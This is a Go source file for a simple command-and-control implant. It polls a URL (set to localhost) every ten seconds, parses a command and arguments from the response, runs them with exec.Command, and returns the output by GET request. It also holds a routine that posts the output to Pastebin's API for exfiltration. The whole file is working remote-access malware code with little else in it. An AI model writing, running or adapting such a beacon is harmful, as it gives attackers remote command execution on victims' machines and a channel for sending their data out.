package main

import(
    "net/http"
    //"log"
    "net/url"
    "io/ioutil"
    "regexp"
    "strings"
    "os/exec"
    "html"
    "bytes"
    "time"
    //"fmt"

    "github.com/mattn/go-shellwords"
)

func main(){
 const cmd_delay time.Duration = 10
    for {
     GetCmd()
     time.Sleep(cmd_delay * time.Second)
    }
}

/*
Grabs a command from a given URL String via GET request. This is parsed via golang's exec function standards. Example of a valid command using all 3 arguments:
(cmd)ls(cmd)
(arg)-la(arg)
(val)/etc(arg)
This will run the command "ls -la /etc"
*/
func GetCmd() (int){
    url := "http://127.0.0.1:8080/"
    resp, err := http.Get(url)
    if err != nil {
        //log.Fatalln(err)
        return 0
    }

    body, err := ioutil.ReadAll(resp.Body)

    if err != nil {
        //log.Fatalln(err)
        return 0
    }
    re := regexp.MustCompile("\\(cmd\\).*?\\(cmd\\)")
    cmdParsed := re.FindStringSubmatch(string(body))
    cmd := strings.Join(cmdParsed, " ")
    cmd = strings.ReplaceAll(cmd, "(cmd)", "")

    re = regexp.MustCompile("\\(arg\\).*?\\(arg\\)")
    argParsed := re.FindStringSubmatch(string(body))
    arg := strings.Join(argParsed, " ")
    arg = strings.ReplaceAll(arg, "(arg)", "")
    arg = html.UnescapeString(arg)


    // Debugging commmand input
    // fmt.Println("Command is: " + cmd + " " + arg + " " + val)
    
    args, err := shellwords.Parse(arg)

    if err != nil{
        //log.Fatalln(err)
        return 0
    }

    var out []byte

    if cmd != "" && len(args) > 0 {
        out, err = exec.Command(cmd, args...).Output()
	} else if cmd != "" {
        out, err = exec.Command(cmd).Output()
	} 

    if err != nil {
        //log.Fatalln(err)
        return 0
    }
    SendResponse(string(out))

    return 0
}

// This function is for handling all C2 Response intergations, by default it will publish a GET Request to a given URL string unless another flag is set.

func SendResponse(output string) (int){

    // Flag to tell output to be directed to the Pastebin intergration
    const pb_Flag bool = false 

    if pb_Flag{
        SendtoPB(output)
    }else{
        url := "http://127.0.0.1:8080/" + url.PathEscape(output)
        _, err := http.Get(url)
        if err != nil {
        //log.Fatalln(err)
        return 0
        }
    }

    return 0

}


// Function to handle Pastebin API Integration for posting C2 responses
func SendtoPB(output string) (int){
    values := url.Values{}
	values.Set("api_dev_key", "")
	values.Set("api_option", "paste")
	values.Set("api_paste_code", output)
	values.Set("api_paste_name", "TEST")
	values.Set("api_paste_expire_date", "10M")
	response, err := http.PostForm("http://pastebin.com/api/api_post.php", values)
	defer response.Body.Close()
	if err != nil {
        //log.Fatalln(err)
        return 0
	}
	if response.StatusCode != 200 {
        //log.Fatalln(response.StatusCode)
        return 0
	}
	buf := bytes.Buffer{}
	_, err = buf.ReadFrom(response.Body)
	if err != nil {
        //log.Fatalln(err)
        return 0
	}
    // Debugging Pastebin response
    // fmt.Println(buf.String())
    return 0
}
